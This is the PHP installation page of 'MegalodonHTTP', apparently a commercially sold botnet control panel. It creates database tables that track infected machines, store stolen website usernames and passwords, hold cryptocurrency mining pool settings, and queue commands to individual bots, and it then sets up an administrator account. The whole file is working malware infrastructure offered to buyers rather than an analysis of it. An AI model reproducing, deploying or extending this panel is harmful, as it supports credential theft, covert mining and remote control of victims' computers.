<?php
include 'inc/config.php';

if(isset($_GET['step']))
{
	switch((int)$_GET['step']){
		case 1:
			$con->query("CREATE TABLE IF NOT EXISTS `bots` (
  `hwid` varchar(64) NOT NULL,
  `ip` varchar(32) NOT NULL,
  `os` tinytext NOT NULL,
  `name` tinytext NOT NULL,
  `ram` tinytext NOT NULL,
  `cpu` tinytext NOT NULL,
  `time` int(10) NOT NULL,
  `country` tinytext NOT NULL,
  `gpu` tinytext NOT NULL,
  `av` tinytext NOT NULL,
  `firstconnected` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;");
			$con->query("ALTER TABLE `bots`
  ADD PRIMARY KEY (`hwid`);");
			$table = 'bots';
			break;
		case 2:
			$con->query("CREATE TABLE IF NOT EXISTS `logs` (
  `hwid` varchar(64) NOT NULL,
  `url` tinytext NOT NULL,
  `username` tinytext NOT NULL,
  `password` tinytext NOT NULL,
  `time` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;");
			$table = 'logs';
			break;
		case 3:
			$con->query("CREATE TABLE IF NOT EXISTS `settings` (
  `super` tinytext NOT NULL,
  `pool` tinytext NOT NULL,
  `worker` tinytext NOT NULL,
  `wpassword` tinytext NOT NULL,
  `botspg` int(11) NOT NULL,
  `logspg` int(11) NOT NULL,
  `deadline` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;");
			$con->query("DELETE FROM settings");
			$con->query("INSERT INTO settings(pool,worker,wpassword,botspg,logspg,deadline) VALUES('','','',10,15,7)");
			$table = 'settings';
			break;
		case 4:
			$con->query("CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(128) NOT NULL,
  `hwid` tinytext NOT NULL,
  `command` varchar(20) NOT NULL,
  `parameter` text NOT NULL,
  `completed` int(11) NOT NULL,
  `time` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;");
			$con->query("ALTER TABLE `tasks`
  ADD PRIMARY KEY (`id`);");
			$con->query("ALTER TABLE `tasks`
  MODIFY `id` int(128) NOT NULL AUTO_INCREMENT;");
			$table = 'tasks';
			break;
		case 5:
			$con->query("CREATE TABLE IF NOT EXISTS `users` (
  `id` int(128) NOT NULL,
  `username` varchar(32) NOT NULL,
  `password` varchar(64) NOT NULL,
  `salt` varchar(10) NOT NULL,
  `access` int(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;");
			$con->query("ALTER TABLE `users`
  ADD PRIMARY KEY (`id`)");
			$con->query("ALTER TABLE `users`
  MODIFY `id` int(128) NOT NULL AUTO_INCREMENT;");
			$table = 'users';
			break;
		case 6:
			include 'inc/functions.php';
			Register(1);
			exit;
			break;
	}
	die("Table $table done");
}
?>
<html>
<head>
	<title>MegalodonHTTP | Installation</title>
	<link rel="shortcut icon" type="image/png" href="img/favicon.png" />
	<link rel="stylesheet" type="text/css" href="css/install.css" media="screen" />
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
</head>
<body>
<div id="wrapper">
	<div id="header">
		<div id="header-title">
			<img src="img/logo.png" width="300">
		</div>
	</div>

	<div id="content">
		<div id="content-box">
			<div id="content-header">
				<div id="content-title">
					Megalodon<span class="green">HTTP</span> | <span class="red">Installation</span>
				</div>
			</div>

			<div id="content-content">
				<div id="content-strip2">
					<div id="content-text">
						Create a administrator account
					</div>
				</div>
				<div id="content-strip">
					<div id="left">
						Username
					</div>

					<div id="right">
						<input type="text" name="username" placeholder="John" />
					</div>
				</div>

				<div id="content-strip">
					<div id="left">
						Password
					</div>

					<div id="right">
						<input type="password" name="password" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
					</div>
				</div>

				<div id="content-strip">
					<div id="left">
						Re-Password
					</div>

					<div id="right">
						<input type="password" name="repassword" placeholder="&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;&bull;" />
					</div>
				</div>

				<div id="content-strip3">
					<div id="left">
						<input type="submit" name="install" value="Install" />
					</div>

					<div id="right">
						<div id="response">
							<!--Installed Tables into `MegalodonHTTP`-->
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	<div id="footer">
		<div id="copyright">
			Thank you for purchasing Megalodon<span class="green">HTTP</div>
	</div>
</div>
</div>

<script>
	var step = 1;
	var sel = $('input[name="install"]');
	sel.click(function(e){
		sel.prop('disabled', true);
		e.preventDefault();
		var int = setInterval(function(){
			if(step < 6)
				$('#response').load('install.php?step='+step);
			else
				$.post('install.php?step=6',{register:1,username:$('input[name="username"]').val(),password:$('input[name="password"]').val(),repassword:$('input[name="repassword"]').val()},
					function(data){
						$('#response').html(data);
						if(data.indexOf('Redirecting') < 0) {
							step--;
							sel.prop('disabled', false);
						}
					});
			if(step==6) clearInterval(int);
			step++;
		},500);
	});
</script>
</body>
</html>